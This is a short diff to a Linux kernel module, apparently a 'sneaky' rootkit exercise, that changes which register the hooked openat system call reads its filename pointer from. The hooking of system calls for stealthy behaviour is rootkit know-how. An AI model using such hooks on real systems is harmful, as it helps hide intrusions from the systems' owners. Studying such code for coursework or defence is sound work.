@@ -77,7 +77,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
   // Cast the filename pointer from the registers
-  char __user *filename = (char __user *)regs->di;
+  char __user *filename = (char __user *)regs->si;
 
   // Buffer to store the filename
   char fname[256];
